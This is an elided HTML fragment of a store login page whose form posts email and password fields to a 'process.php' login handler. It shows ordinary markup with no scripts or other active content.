                ...
                <div class="login-page-content">
                    <div class="login-card">
                        ...
                        <div class="login-card-content">
                            ...
                            <p class="ui-desc">Continue to Store</p>
                        </div>
                        <form method="post" action="process.php?action=login">
                            <div class="login--input" style="margin-bottom: 20px;">
                                ...
                                <input type="email" data-spec="input-field-input-element" aria-invalid="false" data-automation="authentication-email-field" name="email" value="" role="textbox">
                            </div>
                            <div class="login--input">
                                <label for="password" data-spec="label-label">Password</label>
                                <input type="password" data-spec="input-field-input-element" aria-invalid="false" data-automation="authentication-email-field" name="password" value="" role="textbox">
                            </div>
